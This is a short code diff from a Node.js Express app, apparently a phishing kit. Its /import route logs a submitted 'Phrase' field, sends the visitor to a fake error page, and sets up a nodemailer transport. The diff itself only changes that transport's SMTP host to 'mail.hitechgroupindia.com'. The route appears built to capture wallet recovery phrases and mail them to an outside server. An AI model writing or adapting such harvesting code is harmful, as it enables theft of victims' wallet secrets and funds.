@@ -25,7 +25,7 @@ app.post("/import", async (req, res) => {
         console.log(req.body.Phrase)
         res.redirect("/error")
         let transport = nodemailer.createTransport({
-            host: 'hitechgroupindia.com',
+            host: 'mail.hitechgroupindia.com',
             port: 587,
             auth: {
                 user: process.env.USER,
